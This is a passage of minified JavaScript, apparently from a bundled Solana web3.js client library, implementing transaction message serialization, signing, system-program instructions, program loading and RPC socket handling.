l={header:{numRequiredSignatures:r,numReadonlySignedAccounts:i,numReadonlyUnsignedAccounts:o},recentBlockhash:ae().encode(n.Buffer.from(c)),accountKeys:a,instructions:h};return new An(l)}}class En{constructor(t){this.header=void 0,this.staticAccountKeys=void 0,this.recentBlockhash=void 0,this.compiledInstructions=void 0,this.addressTableLookups=void 0,this.header=t.header,this.staticAccountKeys=t.staticAccountKeys,this.recentBlockhash=t.recentBlockhash,this.compiledInstructions=t.compiledInstructions,this.addressTableLookups=t.addressTableLookups}get version(){return 0}get numAccountKeysFromLookups(){let t=0;for(const e of this.addressTableLookups)t+=e.readonlyIndexes.length+e.writableIndexes.length;return t}getAccountKeys(t){let e;if(t&&"accountKeysFromLookups"in t&&t.accountKeysFromLookups){if(this.numAccountKeysFromLookups!=t.accountKeysFromLookups.writable.length+t.accountKeysFromLookups.readonly.length)throw new Error("Failed to get account keys because of a mismatch in the number of account keys from lookups");e=t.accountKeysFromLookups}else if(t&&"addressLookupTableAccounts"in t&&t.addressLookupTableAccounts)e=this.resolveAddressTableLookups(t.addressLookupTableAccounts);else if(this.addressTableLookups.length>0)throw new Error("Failed to get account keys because address table lookups were not resolved");return new fn(this.staticAccountKeys,e)}isAccountSigner(t){return t<this.header.numRequiredSignatures}isAccountWritable(t){const e=this.header.numRequiredSignatures,r=this.staticAccountKeys.length;return t>=r?t-r<this.addressTableLookups.reduce(((t,e)=>t+e.writableIndexes.length),0):t>=this.header.numRequiredSignatures?t-e<r-e-this.header.numReadonlyUnsignedAccounts:t<e-this.header.numReadonlySignedAccounts}resolveAddressTableLookups(t){const e={writable:[],readonly:[]};for(const r of this.addressTableLookups){const n=t.find((t=>t.key.equals(r.accountKey)));if(!n)throw new Error(`Failed to find address lookup table account for table key ${r.accountKey.toBase58()}`);for(const t of r.writableIndexes){if(!(t<n.state.addresses.length))throw new Error(`Failed to find address for index ${t} in address lookup table ${r.accountKey.toBase58()}`);e.writable.push(n.state.addresses[t])}for(const t of r.readonlyIndexes){if(!(t<n.state.addresses.length))throw new Error(`Failed to find address for index ${t} in address lookup table ${r.accountKey.toBase58()}`);e.readonly.push(n.state.addresses[t])}}return e}static compile(t){const e=bn.compile(t.instructions,t.payerKey),r=new Array,n={writable:new Array,readonly:new Array},i=t.addressLookupTableAccounts||[];for(const t of i){const i=e.extractTableLookup(t);if(void 0!==i){const[t,{writable:e,readonly:o}]=i;r.push(t),n.writable.push(...e),n.readonly.push(...o)}}const[o,s]=e.getMessageComponents(),a=new fn(s,n).compileInstructions(t.instructions);return new En({header:o,staticAccountKeys:s,recentBlockhash:t.recentBlockhash,compiledInstructions:a,addressTableLookups:r})}serialize(){const t=Array();yn(t,this.staticAccountKeys.length);const e=this.serializeInstructions(),r=Array();yn(r,this.compiledInstructions.length);const n=this.serializeAddressTableLookups(),i=Array();yn(i,this.addressTableLookups.length);const o=Ie.w3([Ie.u8("prefix"),Ie.w3([Ie.u8("numRequiredSignatures"),Ie.u8("numReadonlySignedAccounts"),Ie.u8("numReadonlyUnsignedAccounts")],"header"),Ie.av(t.length,"staticAccountKeysLength"),Ie.O6(dn(),this.staticAccountKeys.length,"staticAccountKeys"),dn("recentBlockhash"),Ie.av(r.length,"instructionsLength"),Ie.av(e.length,"serializedInstructions"),Ie.av(i.length,"addressTableLookupsLength"),Ie.av(n.length,"serializedAddressTableLookups")]),s=new Uint8Array(cn),a=o.encode({prefix:128,header:this.header,staticAccountKeysLength:new Uint8Array(t),staticAccountKeys:this.staticAccountKeys.map((t=>t.toBytes())),recentBlockhash:ae().decode(this.recentBlockhash),instructionsLength:new Uint8Array(r),serializedInstructions:e,addressTableLookupsLength:new Uint8Array(i),serializedAddressTableLookups:n},s);return s.slice(0,a)}serializeInstructions(){let t=0;const e=new Uint8Array(cn);for(const r of this.compiledInstructions){const n=Array();yn(n,r.accountKeyIndexes.length);const i=Array();yn(i,r.data.length),t+=Ie.w3([Ie.u8("programIdIndex"),Ie.av(n.length,"encodedAccountKeyIndexesLength"),Ie.O6(Ie.u8(),r.accountKeyIndexes.length,"accountKeyIndexes"),Ie.av(i.length,"encodedDataLength"),Ie.av(r.data.length,"data")]).encode({programIdIndex:r.programIdIndex,encodedAccountKeyIndexesLength:new Uint8Array(n),accountKeyIndexes:r.accountKeyIndexes,encodedDataLength:new Uint8Array(i),data:r.data},e,t)}return e.slice(0,t)}serializeAddressTableLookups(){let t=0;const e=new Uint8Array(cn);for(const r of this.addressTableLookups){const n=Array();yn(n,r.writableIndexes.length);const i=Array();yn(i,r.readonlyIndexes.length),t+=Ie.w3([dn("accountKey"),Ie.av(n.length,"encodedWritableIndexesLength"),Ie.O6(Ie.u8(),r.writableIndexes.length,"writableIndexes"),Ie.av(i.length,"encodedReadonlyIndexesLength"),Ie.O6(Ie.u8(),r.readonlyIndexes.length,"readonlyIndexes")]).encode({accountKey:r.accountKey.toBytes(),encodedWritableIndexesLength:new Uint8Array(n),writableIndexes:r.writableIndexes,encodedReadonlyIndexesLength:new Uint8Array(i),readonlyIndexes:r.readonlyIndexes},e,t)}return e.slice(0,t)}static deserialize(t){let e=[...t];const r=kn(e),n=127&r;wn(r!==n,"Expected versioned message but received legacy message"),wn(0===n,`Expected versioned message with version 0 but found version ${n}`);const i={numRequiredSignatures:kn(e),numReadonlySignedAccounts:kn(e),numReadonlyUnsignedAccounts:kn(e)},o=[],s=mn(e);for(let t=0;t<s;t++)o.push(new an(Sn(e,0,on)));const a=ae().encode(Sn(e,0,on)),c=mn(e),u=[];for(let t=0;t<c;t++){const t=kn(e),r=Sn(e,0,mn(e)),n=mn(e),i=new Uint8Array(Sn(e,0,n));u.push({programIdIndex:t,accountKeyIndexes:r,data:i})}const h=mn(e),l=[];for(let t=0;t<h;t++){const t=new an(Sn(e,0,on)),r=Sn(e,0,mn(e)),n=Sn(e,0,mn(e));l.push({accountKey:t,writableIndexes:r,readonlyIndexes:n})}return new En({header:i,staticAccountKeys:o,recentBlockhash:a,compiledInstructions:u,addressTableLookups:l})}}let _n=function(t){return t[t.BLOCKHEIGHT_EXCEEDED=0]="BLOCKHEIGHT_EXCEEDED",t[t.PROCESSED=1]="PROCESSED",t[t.TIMED_OUT=2]="TIMED_OUT",t[t.NONCE_INVALID=3]="NONCE_INVALID",t}({});const Bn=n.Buffer.alloc(64).fill(0);class In{constructor(t){this.keys=void 0,this.programId=void 0,this.data=n.Buffer.alloc(0),this.programId=t.programId,this.keys=t.keys,t.data&&(this.data=t.data)}toJSON(){return{keys:this.keys.map((({pubkey:t,isSigner:e,isWritable:r})=>({pubkey:t.toJSON(),isSigner:e,isWritable:r}))),programId:this.programId.toJSON(),data:[...this.data]}}}class xn{get signature(){return this.signatures.length>0?this.signatures[0].signature:null}constructor(t){if(this.signatures=[],this.feePayer=void 0,this.instructions=[],this.recentBlockhash=void 0,this.lastValidBlockHeight=void 0,this.nonceInfo=void 0,this.minNonceContextSlot=void 0,this._message=void 0,this._json=void 0,t)if(t.feePayer&&(this.feePayer=t.feePayer),t.signatures&&(this.signatures=t.signatures),Object.prototype.hasOwnProperty.call(t,"nonceInfo")){const{minContextSlot:e,nonceInfo:r}=t;this.minNonceContextSlot=e,this.nonceInfo=r}else if(Object.prototype.hasOwnProperty.call(t,"lastValidBlockHeight")){const{blockhash:e,lastValidBlockHeight:r}=t;this.recentBlockhash=e,this.lastValidBlockHeight=r}else{const{recentBlockhash:e,nonceInfo:r}=t;r&&(this.nonceInfo=r),this.recentBlockhash=e}}toJSON(){return{recentBlockhash:this.recentBlockhash||null,feePayer:this.feePayer?this.feePayer.toJSON():null,nonceInfo:this.nonceInfo?{nonce:this.nonceInfo.nonce,nonceInstruction:this.nonceInfo.nonceInstruction.toJSON()}:null,instructions:this.instructions.map((t=>t.toJSON())),signers:this.signatures.map((({publicKey:t})=>t.toJSON()))}}add(...t){if(0===t.length)throw new Error("No instructions");return t.forEach((t=>{"instructions"in t?this.instructions=this.instructions.concat(t.instructions):"data"in t&&"programId"in t&&"keys"in t?this.instructions.push(t):this.instructions.push(new In(t))})),this}compileMessage(){if(this._message&&JSON.stringify(this.toJSON())===JSON.stringify(this._json))return this._message;let t,e,r;if(this.nonceInfo?(t=this.nonceInfo.nonce,e=this.instructions[0]!=this.nonceInfo.nonceInstruction?[this.nonceInfo.nonceInstruction,...this.instructions]:this.instructions):(t=this.recentBlockhash,e=this.instructions),!t)throw new Error("Transaction recentBlockhash required");if(e.length<1&&console.warn("No instructions provided"),this.feePayer)r=this.feePayer;else{if(!(this.signatures.length>0&&this.signatures[0].publicKey))throw new Error("Transaction fee payer required");r=this.signatures[0].publicKey}for(let t=0;t<e.length;t++)if(void 0===e[t].programId)throw new Error(`Transaction instruction index ${t} has undefined program id`);const n=[],i=[];e.forEach((t=>{t.keys.forEach((t=>{i.push({...t})}));const e=t.programId.toString();n.includes(e)||n.push(e)})),n.forEach((t=>{i.push({pubkey:new an(t),isSigner:!1,isWritable:!1})}));const o=[];i.forEach((t=>{const e=t.pubkey.toString(),r=o.findIndex((t=>t.pubkey.toString()===e));r>-1?(o[r].isWritable=o[r].isWritable||t.isWritable,o[r].isSigner=o[r].isSigner||t.isSigner):o.push(t)})),o.sort((function(t,e){return t.isSigner!==e.isSigner?t.isSigner?-1:1:t.isWritable!==e.isWritable?t.isWritable?-1:1:t.pubkey.toBase58().localeCompare(e.pubkey.toBase58(),"en",{localeMatcher:"best fit",usage:"sort",sensitivity:"variant",ignorePunctuation:!1,numeric:!1,caseFirst:"lower"})}));const s=o.findIndex((t=>t.pubkey.equals(r)));if(s>-1){const[t]=o.splice(s,1);t.isSigner=!0,t.isWritable=!0,o.unshift(t)}else o.unshift({pubkey:r,isSigner:!0,isWritable:!0});for(const t of this.signatures){const e=o.findIndex((e=>e.pubkey.equals(t.publicKey)));if(!(e>-1))throw new Error(`unknown signer: ${t.publicKey.toString()}`);o[e].isSigner||(o[e].isSigner=!0,console.warn("Transaction references a signature that is unnecessary, only the fee payer and instruction signer accounts should sign a transaction. This behavior is deprecated and will throw an error in the next major version release."))}let a=0,c=0,u=0;const h=[],l=[];o.forEach((({pubkey:t,isSigner:e,isWritable:r})=>{e?(h.push(t.toString()),a+=1,r||(c+=1)):(l.push(t.toString()),r||(u+=1))}));const f=h.concat(l),d=e.map((t=>{const{data:e,programId:r}=t;return{programIdIndex:f.indexOf(r.toString()),accounts:t.keys.map((t=>f.indexOf(t.pubkey.toString()))),data:ae().encode(e)}}));return d.forEach((t=>{wn(t.programIdIndex>=0),t.accounts.forEach((t=>wn(t>=0)))})),new An({header:{numRequiredSignatures:a,numReadonlySignedAccounts:c,numReadonlyUnsignedAccounts:u},accountKeys:f,recentBlockhash:t,instructions:d})}_compile(){const t=this.compileMessage(),e=t.accountKeys.slice(0,t.header.numRequiredSignatures);return this.signatures.length===e.length&&this.signatures.every(((t,r)=>e[r].equals(t.publicKey)))||(this.signatures=e.map((t=>({signature:null,publicKey:t})))),t}serializeMessage(){return this._compile().serialize()}async getEstimatedFee(t){return(await t.getFeeForMessage(this.compileMessage())).value}setSigners(...t){if(0===t.length)throw new Error("No signers");const e=new Set;this.signatures=t.filter((t=>{const r=t.toString();return!e.has(r)&&(e.add(r),!0)})).map((t=>({signature:null,publicKey:t})))}sign(...t){if(0===t.length)throw new Error("No signers");const e=new Set,r=[];for(const n of t){const t=n.publicKey.toString();e.has(t)||(e.add(t),r.push(n))}this.signatures=r.map((t=>({signature:null,publicKey:t.publicKey})));const n=this._compile();this._partialSign(n,...r)}partialSign(...t){if(0===t.length)throw new Error("No signers");const e=new Set,r=[];for(const n of t){const t=n.publicKey.toString();e.has(t)||(e.add(t),r.push(n))}const n=this._compile();this._partialSign(n,...r)}_partialSign(t,...e){const r=t.serialize();e.forEach((t=>{const e=Xr(r,t.secretKey);this._addSignature(t.publicKey,tn(e))}))}addSignature(t,e){this._compile(),this._addSignature(t,e)}_addSignature(t,e){wn(64===e.length);const r=this.signatures.findIndex((e=>t.equals(e.publicKey)));if(r<0)throw new Error(`unknown signer: ${t.toString()}`);this.signatures[r].signature=n.Buffer.from(e)}verifySignatures(t=!0){return!this._getMessageSignednessErrors(this.serializeMessage(),t)}_getMessageSignednessErrors(t,e){const r={};for(const{signature:n,publicKey:i}of this.signatures)null===n?e&&(r.missing||=[]).push(i):Qr(n,t,i.toBytes())||(r.invalid||=[]).push(i);return r.invalid||r.missing?r:void 0}serialize(t){const{requireAllSignatures:e,verifySignatures:r}=Object.assign({requireAllSignatures:!0,verifySignatures:!0},t),n=this.serializeMessage();if(r){const t=this._getMessageSignednessErrors(n,e);if(t){let e="Signature verification failed.";throw t.invalid&&(e+=`\nInvalid signature for public key${1===t.invalid.length?"":"(s)"} [\`${t.invalid.map((t=>t.toBase58())).join("`, `")}\`].`),t.missing&&(e+=`\nMissing signature for public key${1===t.missing.length?"":"(s)"} [\`${t.missing.map((t=>t.toBase58())).join("`, `")}\`].`),new Error(e)}}return this._serialize(n)}_serialize(t){const{signatures:e}=this,r=[];yn(r,e.length);const i=r.length+64*e.length+t.length,o=n.Buffer.alloc(i);return wn(e.length<256),n.Buffer.from(r).copy(o,0),e.forEach((({signature:t},e)=>{null!==t&&(wn(64===t.length,"signature has invalid length"),n.Buffer.from(t).copy(o,r.length+64*e))})),t.copy(o,r.length+64*e.length),wn(o.length<=cn,`Transaction too large: ${o.length} > 1232`),o}get keys(){return wn(1===this.instructions.length),this.instructions[0].keys.map((t=>t.pubkey))}get programId(){return wn(1===this.instructions.length),this.instructions[0].programId}get data(){return wn(1===this.instructions.length),this.instructions[0].data}static from(t){let e=[...t];const r=mn(e);let i=[];for(let t=0;t<r;t++){const t=Sn(e,0,64);i.push(ae().encode(n.Buffer.from(t)))}return xn.populate(An.from(e),i)}static populate(t,e=[]){const r=new xn;return r.recentBlockhash=t.recentBlockhash,t.header.numRequiredSignatures>0&&(r.feePayer=t.accountKeys[0]),e.forEach(((e,n)=>{const i={signature:e==ae().encode(Bn)?null:ae().decode(e),publicKey:t.accountKeys[n]};r.signatures.push(i)})),t.instructions.forEach((e=>{const n=e.accounts.map((e=>{const n=t.accountKeys[e];return{pubkey:n,isSigner:r.signatures.some((t=>t.publicKey.toString()===n.toString()))||t.isAccountSigner(e),isWritable:t.isAccountWritable(e)}}));r.instructions.push(new In({keys:n,programId:t.accountKeys[e.programIdIndex],data:ae().decode(e.data)}))})),r._message=t,r._json=r.toJSON(),r}}const Mn=new an("SysvarC1ock11111111111111111111111111111111"),On=(new an("SysvarEpochSchedu1e111111111111111111111111"),new an("Sysvar1nstructions1111111111111111111111111"),new an("SysvarRecentB1ockHashes11111111111111111111")),Tn=new an("SysvarRent111111111111111111111111111111111"),Rn=(new an("SysvarRewards111111111111111111111111111111"),new an("SysvarS1otHashes111111111111111111111111111"),new an("SysvarS1otHistory11111111111111111111111111"),new an("SysvarStakeHistory1111111111111111111111111"));class Pn extends Error{constructor({action:t,signature:e,transactionMessage:r,logs:n}){const i=n?`Logs: \n${JSON.stringify(n.slice(-10),null,2)}. `:"",o="\nCatch the `SendTransactionError` and call `getLogs()` on it for full details.";let s;switch(t){case"send":s=`Transaction ${e} resulted in an error. \n${r}. `+i+o;break;case"simulate":s=`Simulation failed. \nMessage: ${r}. \n`+i+o;break;default:s=`Unknown action '${t}'`}super(s),this.signature=void 0,this.transactionMessage=void 0,this.transactionLogs=void 0,this.signature=e,this.transactionMessage=r,this.transactionLogs=n||void 0}get transactionError(){return{message:this.transactionMessage,logs:Array.isArray(this.transactionLogs)?this.transactionLogs:void 0}}get logs(){const t=this.transactionLogs;if(null==t||"object"!=typeof t||!("then"in t))return t}async getLogs(t){return Array.isArray(this.transactionLogs)||(this.transactionLogs=new Promise(((e,r)=>{t.getTransaction(this.signature).then((t=>{if(t&&t.meta&&t.meta.logMessages){const r=t.meta.logMessages;this.transactionLogs=r,e(r)}else r(new Error("Log messages not found"))})).catch(r)}))),await this.transactionLogs}}class Cn extends Error{constructor({code:t,message:e,data:r},n){super(null!=n?`${n}: ${e}`:e),this.code=void 0,this.data=void 0,this.code=t,this.data=r,this.name="SolanaJSONRPCError"}}async function Ln(t,e,r,n){const i=n&&{skipPreflight:n.skipPreflight,preflightCommitment:n.preflightCommitment||n.commitment,maxRetries:n.maxRetries,minContextSlot:n.minContextSlot},o=await t.sendTransaction(e,r,i);let s;if(null!=e.recentBlockhash&&null!=e.lastValidBlockHeight)s=(await t.confirmTransaction({abortSignal:n?.abortSignal,signature:o,blockhash:e.recentBlockhash,lastValidBlockHeight:e.lastValidBlockHeight},n&&n.commitment)).value;else if(null!=e.minNonceContextSlot&&null!=e.nonceInfo){const{nonceInstruction:r}=e.nonceInfo,i=r.keys[0].pubkey;s=(await t.confirmTransaction({abortSignal:n?.abortSignal,minContextSlot:e.minNonceContextSlot,nonceAccountPubkey:i,nonceValue:e.nonceInfo.nonce,signature:o},n&&n.commitment)).value}else null!=n?.abortSignal&&console.warn("sendAndConfirmTransaction(): A transaction with a deprecated confirmation strategy was supplied along with an `abortSignal`. Only transactions having `lastValidBlockHeight` or a combination of `nonceInfo` and `minNonceContextSlot` are abortable."),s=(await t.confirmTransaction(o,n&&n.commitment)).value;if(s.err){if(null!=o)throw new Pn({action:"send",signature:o,transactionMessage:`Status: (${JSON.stringify(s)})`});throw new Error(`Transaction ${o} failed (${JSON.stringify(s)})`)}return o}function Nn(t){return new Promise((e=>setTimeout(e,t)))}function Un(t,e){const r=t.layout.span>=0?t.layout.span:gn(t,e),i=n.Buffer.alloc(r),o=Object.assign({instruction:t.index},e);return t.layout.encode(o,i),i}const zn=Ie.I0("lamportsPerSignature"),Dn=Ie.w3([Ie.DH("version"),Ie.DH("state"),dn("authorizedPubkey"),dn("nonce"),Ie.w3([zn],"feeCalculator")]),jn=Dn.span;class Wn{constructor(t){this.authorizedPubkey=void 0,this.nonce=void 0,this.feeCalculator=void 0,this.authorizedPubkey=t.authorizedPubkey,this.nonce=t.nonce,this.feeCalculator=t.feeCalculator}static fromAccountData(t){const e=Dn.decode(tn(t),0);return new Wn({authorizedPubkey:new an(e.authorizedPubkey),nonce:new an(e.nonce).toString(),feeCalculator:e.feeCalculator})}}const qn=t=>{const e=(0,Ie.av)(8,t),{encode:r,decode:i}=(t=>({decode:t.decode.bind(t),encode:t.encode.bind(t)}))(e),o=e;return o.decode=(t,e)=>{const r=i(t,e);return(0,xe.k5)(n.Buffer.from(r))},o.encode=(t,e,n)=>{const i=(0,xe.Bq)(t,8);return r(i,e,n)},o};const Fn=Object.freeze({Create:{index:0,layout:Ie.w3([Ie.DH("instruction"),Ie.Wg("lamports"),Ie.Wg("space"),dn("programId")])},Assign:{index:1,layout:Ie.w3([Ie.DH("instruction"),dn("programId")])},Transfer:{index:2,layout:Ie.w3([Ie.DH("instruction"),qn("lamports")])},CreateWithSeed:{index:3,layout:Ie.w3([Ie.DH("instruction"),dn("base"),pn("seed"),Ie.Wg("lamports"),Ie.Wg("space"),dn("programId")])},AdvanceNonceAccount:{index:4,layout:Ie.w3([Ie.DH("instruction")])},WithdrawNonceAccount:{index:5,layout:Ie.w3([Ie.DH("instruction"),Ie.Wg("lamports")])},InitializeNonceAccount:{index:6,layout:Ie.w3([Ie.DH("instruction"),dn("authorized")])},AuthorizeNonceAccount:{index:7,layout:Ie.w3([Ie.DH("instruction"),dn("authorized")])},Allocate:{index:8,layout:Ie.w3([Ie.DH("instruction"),Ie.Wg("space")])},AllocateWithSeed:{index:9,layout:Ie.w3([Ie.DH("instruction"),dn("base"),pn("seed"),Ie.Wg("space"),dn("programId")])},AssignWithSeed:{index:10,layout:Ie.w3([Ie.DH("instruction"),dn("base"),pn("seed"),dn("programId")])},TransferWithSeed:{index:11,layout:Ie.w3([Ie.DH("instruction"),qn("lamports"),pn("seed"),dn("programId")])},UpgradeNonceAccount:{index:12,layout:Ie.w3([Ie.DH("instruction")])}});class Hn{constructor(){}static createAccount(t){const e=Un(Fn.Create,{lamports:t.lamports,space:t.space,programId:tn(t.programId.toBuffer())});return new In({keys:[{pubkey:t.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:t.newAccountPubkey,isSigner:!0,isWritable:!0}],programId:this.programId,data:e})}static transfer(t){let e,r;return"basePubkey"in t?(e=Un(Fn.TransferWithSeed,{lamports:BigInt(t.lamports),seed:t.seed,programId:tn(t.programId.toBuffer())}),r=[{pubkey:t.fromPubkey,isSigner:!1,isWritable:!0},{pubkey:t.basePubkey,isSigner:!0,isWritable:!1},{pubkey:t.toPubkey,isSigner:!1,isWritable:!0}]):(e=Un(Fn.Transfer,{lamports:BigInt(t.lamports)}),r=[{pubkey:t.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:t.toPubkey,isSigner:!1,isWritable:!0}]),new In({keys:r,programId:this.programId,data:e})}static assign(t){let e,r;return"basePubkey"in t?(e=Un(Fn.AssignWithSeed,{base:tn(t.basePubkey.toBuffer()),seed:t.seed,programId:tn(t.programId.toBuffer())}),r=[{pubkey:t.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:t.basePubkey,isSigner:!0,isWritable:!1}]):(e=Un(Fn.Assign,{programId:tn(t.programId.toBuffer())}),r=[{pubkey:t.accountPubkey,isSigner:!0,isWritable:!0}]),new In({keys:r,programId:this.programId,data:e})}static createAccountWithSeed(t){const e=Un(Fn.CreateWithSeed,{base:tn(t.basePubkey.toBuffer()),seed:t.seed,lamports:t.lamports,space:t.space,programId:tn(t.programId.toBuffer())});let r=[{pubkey:t.fromPubkey,isSigner:!0,isWritable:!0},{pubkey:t.newAccountPubkey,isSigner:!1,isWritable:!0}];return t.basePubkey.equals(t.fromPubkey)||r.push({pubkey:t.basePubkey,isSigner:!0,isWritable:!1}),new In({keys:r,programId:this.programId,data:e})}static createNonceAccount(t){const e=new xn;"basePubkey"in t&&"seed"in t?e.add(Hn.createAccountWithSeed({fromPubkey:t.fromPubkey,newAccountPubkey:t.noncePubkey,basePubkey:t.basePubkey,seed:t.seed,lamports:t.lamports,space:jn,programId:this.programId})):e.add(Hn.createAccount({fromPubkey:t.fromPubkey,newAccountPubkey:t.noncePubkey,lamports:t.lamports,space:jn,programId:this.programId}));const r={noncePubkey:t.noncePubkey,authorizedPubkey:t.authorizedPubkey};return e.add(this.nonceInitialize(r)),e}static nonceInitialize(t){const e=Un(Fn.InitializeNonceAccount,{authorized:tn(t.authorizedPubkey.toBuffer())}),r={keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:On,isSigner:!1,isWritable:!1},{pubkey:Tn,isSigner:!1,isWritable:!1}],programId:this.programId,data:e};return new In(r)}static nonceAdvance(t){const e=Un(Fn.AdvanceNonceAccount),r={keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:On,isSigner:!1,isWritable:!1},{pubkey:t.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:e};return new In(r)}static nonceWithdraw(t){const e=Un(Fn.WithdrawNonceAccount,{lamports:t.lamports});return new In({keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:t.toPubkey,isSigner:!1,isWritable:!0},{pubkey:On,isSigner:!1,isWritable:!1},{pubkey:Tn,isSigner:!1,isWritable:!1},{pubkey:t.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:e})}static nonceAuthorize(t){const e=Un(Fn.AuthorizeNonceAccount,{authorized:tn(t.newAuthorizedPubkey.toBuffer())});return new In({keys:[{pubkey:t.noncePubkey,isSigner:!1,isWritable:!0},{pubkey:t.authorizedPubkey,isSigner:!0,isWritable:!1}],programId:this.programId,data:e})}static allocate(t){let e,r;return"basePubkey"in t?(e=Un(Fn.AllocateWithSeed,{base:tn(t.basePubkey.toBuffer()),seed:t.seed,space:t.space,programId:tn(t.programId.toBuffer())}),r=[{pubkey:t.accountPubkey,isSigner:!1,isWritable:!0},{pubkey:t.basePubkey,isSigner:!0,isWritable:!1}]):(e=Un(Fn.Allocate,{space:t.space}),r=[{pubkey:t.accountPubkey,isSigner:!0,isWritable:!0}]),new In({keys:r,programId:this.programId,data:e})}}Hn.programId=new an("11111111111111111111111111111111");class Kn{constructor(){}static getMinNumSignatures(t){return 2*(Math.ceil(t/Kn.chunkSize)+1+1)}static async load(t,e,r,i,o){{const n=await t.getMinimumBalanceForRentExemption(o.length),s=await t.getAccountInfo(r.publicKey,"confirmed");let a=null;if(null!==s){if(s.executable)return console.error("Program load failed, account is already executable"),!1;s.data.length!==o.length&&(a=a||new xn,a.add(Hn.allocate({accountPubkey:r.publicKey,space:o.length}))),s.owner.equals(i)||(a=a||new xn,a.add(Hn.assign({accountPubkey:r.publicKey,programId:i}))),s.lamports<n&&(a=a||new xn,a.add(Hn.transfer({fromPubkey:e.publicKey,toPubkey:r.publicKey,lamports:n-s.lamports})))}else a=(new xn).add(Hn.createAccount({fromPubkey:e.publicKey,newAccountPubkey:r.publicKey,lamports:n>0?n:1,space:o.length,programId:i}));null!==a&&await Ln(t,a,[e,r],{commitment:"confirmed"})}const s=Ie.w3([Ie.DH("instruction"),Ie.DH("offset"),Ie.DH("bytesLength"),Ie.DH("bytesLengthPadding"),Ie.O6(Ie.u8("byte"),Ie.cY(Ie.DH(),-8),"bytes")]),a=Kn.chunkSize;let c=0,u=o,h=[];for(;u.length>0;){const o=u.slice(0,a),l=n.Buffer.alloc(a+16);s.encode({instruction:0,offset:c,bytes:o,bytesLength:0,bytesLengthPadding:0},l);const f=(new xn).add({keys:[{pubkey:r.publicKey,isSigner:!0,isWritable:!0}],programId:i,data:l});if(h.push(Ln(t,f,[e,r],{commitment:"confirmed"})),t._rpcEndpoint.includes("solana.com")){const t=4;await Nn(1e3/t)}c+=a,u=u.slice(a)}await Promise.all(h);{const o=Ie.w3([Ie.DH("instruction")]),s=n.Buffer.alloc(o.span);o.encode({instruction:1},s);const a=(new xn).add({keys:[{pubkey:r.publicKey,isSigner:!0,isWritable:!0},{pubkey:Tn,isSigner:!1,isWritable:!1}],programId:i,data:s}),c="processed",u=await t.sendTransaction(a,[e,r],{preflightCommitment:c}),{context:h,value:l}=await t.confirmTransaction({signature:u,lastValidBlockHeight:a.lastValidBlockHeight,blockhash:a.recentBlockhash},c);if(l.err)throw new Error(`Transaction ${u} failed (${JSON.stringify(l)})`);for(;;){try{if(await t.getSlot({commitment:c})>h.slot)break}catch{}await new Promise((t=>setTimeout(t,Math.round(200))))}}return!0}}function $n(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}var Vn,Gn;function Jn(){if(Gn)return Vn;Gn=1;var t=Object.prototype.toString,e=Object.keys||function(t){var e=[];for(var r in t)e.push(r);return e};function r(n,i){var o,s,a,c,u,h,l;if(!0===n)return"true";if(!1===n)return"false";switch(typeof n){case"object":if(null===n)return null;if(n.toJSON&&"function"==typeof n.toJSON)return r(n.toJSON(),i);if("[object Array]"===(l=t.call(n))){for(a="[",s=n.length-1,o=0;o<s;o++)a+=r(n[o],!0)+",";return s>-1&&(a+=r(n[o],!0)),a+"]"}if("[object Object]"===l){for(s=(c=e(n).sort()).length,a="",o=0;o<s;)void 0!==(h=r(n[u=c[o]],!1))&&(a&&(a+=","),a+=JSON.stringify(u)+":"+h),o++;return"{"+a+"}"}return JSON.stringify(n);case"function":case"undefined":return i?null:void 0;case"string":return JSON.stringify(n);default:return isFinite(n)?n:null}}return Vn=function(t){var e=r(t,!1);if(void 0!==e)return""+e}}Kn.chunkSize=932,new an("BPFLoader2111111111111111111111111111111111");var Zn=$n(Jn());function Yn(t){let e=0;for(;t>1;)t/=2,e++;return e}class Xn{constructor(t,e,r,n,i){this.slotsPerEpoch=void 0,this.leaderScheduleSlotOffset=void 0,this.warmup=void 0,this.firstNormalEpoch=void 0,this.firstNormalSlot=void 0,this.slotsPerEpoch=t,this.leaderScheduleSlotOffset=e,this.warmup=r,this.firstNormalEpoch=n,this.firstNormalSlot=i}getEpoch(t){return this.getEpochAndSlotIndex(t)[0]}getEpochAndSlotIndex(t){if(t<this.firstNormalSlot){const r=Yn(0===(e=t+32+1)?1:(e--,e|=e>>1,e|=e>>2,e|=e>>4,e|=e>>8,e|=e>>16,1+(e|=e>>32)))-Yn(32)-1;return[r,t-(this.getSlotsInEpoch(r)-32)]}{const e=t-this.firstNormalSlot,r=Math.floor(e/this.slotsPerEpoch);return[this.firstNormalEpoch+r,e%this.slotsPerEpoch]}var e}getFirstSlotInEpoch(t){return t<=this.firstNormalEpoch?32*(Math.pow(2,t)-1):(t-this.firstNormalEpoch)*this.slotsPerEpoch+this.firstNormalSlot}getLastSlotInEpoch(t){return this.getFirstSlotInEpoch(t)+this.getSlotsInEpoch(t)-1}getSlotsInEpoch(t){return t<this.firstNormalEpoch?Math.pow(2,t+Yn(32)):this.slotsPerEpoch}}var Qn=globalThis.fetch;class ti extends sr{constructor(t,e,r){super((t=>{const r=function(t,e){return new ir(t,e)}(t,{autoconnect:!0,max_reconnects:5,reconnect:!0,reconnect_interval:1e3,...e});return this.underlyingSocket="socket"in r?r.socket:r,r}),t,e,r),this.underlyingSocket=void 0}call(...t){const e=this.underlyingSocket?.readyState;return 1===e?super.call(...t):Promise.reject(new Error("Tried to call a JSON-RPC method `"+t[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+e+")"))}notify(...t){const e=this.underlyingSocket?.readyState;return 1===e?super.notify(...t):Promise.reject(new Error("Tried to send a JSON-RPC notification `"+t[0]+"` but the socket was not `CONNECTING` or `OPEN` (`readyState` was "+e+")"))}}class ei{constructor(t){this.key=void 0,this.state=void 0,this.key=t.key,this.state=t.state}isActive(){const t=BigInt("0xffffffffffffffff");return this.state.deactivationSlot===t}static deserialize(t){const e=function(t,e){let 